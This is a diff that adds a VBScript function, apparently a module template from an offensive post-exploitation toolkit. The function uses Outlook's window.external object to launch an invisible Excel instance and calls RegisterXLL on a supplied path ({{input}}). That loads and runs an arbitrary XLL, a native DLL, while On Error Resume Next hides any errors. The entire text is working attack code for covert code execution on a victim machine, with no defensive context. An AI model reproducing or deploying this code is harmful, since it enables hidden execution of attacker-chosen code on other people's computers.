@@ -1,0 +1,7 @@
+Function execute_registerxll()
+    On Error Resume Next
+    Set excel = window.external.OutlookApplication.CreateObject("Excel.Application")
+    excel.Visible = false
+    return_data = excel.RegisterXLL({{input}})
+    execute_registerxll = "XLL Executed: " & return_data
+End Function
